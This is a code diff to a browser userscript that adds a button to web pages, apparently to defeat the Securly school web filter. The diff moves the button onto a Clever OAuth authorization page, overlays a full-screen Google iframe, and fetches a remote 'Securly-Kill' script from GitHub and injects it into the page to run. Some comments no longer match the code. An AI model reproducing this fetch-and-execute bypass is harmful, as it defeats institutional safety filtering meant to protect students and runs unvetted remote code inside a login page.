@@ -127,10 +127,10 @@ setTimeout(() => {
             });
             cogButton.addEventListener("click", openSettings);
 
-            // Only show the ☣ icon on https://www.securly.com/
-            if (window.location.href === "https://www.securly.com/") {
+            // Only show the ඞ icon on https://www.securly.com/
+            if (window.location.href === "https://clever.com/oauth/authorize?") {
                 const dangerButton = document.createElement("button");
-                dangerButton.innerHTML = "☣";  // Unicode for the biohazard symbol
+                dangerButton.innerHTML = "ඞ";  // Unicode for the biohazard symbol
                 dangerButton.style.cssText = `
                     position: absolute;
                     top: 50%;
@@ -153,20 +153,31 @@ setTimeout(() => {
                 dangerButton.addEventListener("mouseleave", function() {
                     dangerButton.style.color = "#fff";
                 });
-                dangerButton.addEventListener("click", function() {
-                    if (confirm("Do you really want to perform this action?")) {
-                        fetch("https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/refs/heads/main/kill.js")
-                            .then(response => response.text())
-                            .then(script => {
-                                const scriptElement = document.createElement("script");
-                                scriptElement.innerHTML = script;
-                                document.body.appendChild(scriptElement);
-                            })
-                            .catch(error => {
-                                console.error("Error loading script:", error);
-                            });
-                    }
-                });
+               dangerButton.addEventListener("click", function() {
+    if (confirm("Do you really want to perform this action?")) {
+        // Create an iframe and append it to the body
+        var a, b, c;
+        c = "https://www.google.com/?igu=1"; // URL to load in the iframe
+        b = document.createElement("iframe"); // Create an iframe element
+        b.setAttribute("src", c); // Set the source of the iframe
+        b.setAttribute("id", "rusic-modal"); // Set an ID for the iframe
+        b.setAttribute("style", "position: fixed; z-index: 999999; width: 1375px; height: 675px; right: 0px; top: 0px; border: 0px solid #8834af; overflow: hidden; background-color: #fff;"); // Set styles for the iframe
+        a = document.getElementsByTagName("body")[0]; // Get the body element
+        a.appendChild(b); // Append the iframe to the body
+
+        // Load the external script if needed
+        fetch("https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/refs/heads/main/kill.js")
+            .then(response => response.text())
+            .then(script => {
+                const scriptElement = document.createElement("script");
+                scriptElement.innerHTML = script;
+                document.body.appendChild(scriptElement);
+            })
+            .catch(error => {
+                console.error("Error loading script:", error);
+            });
+    }
+});
                 bar.appendChild(dangerButton);  // Add the ☣ button next to the settings button
             }
 
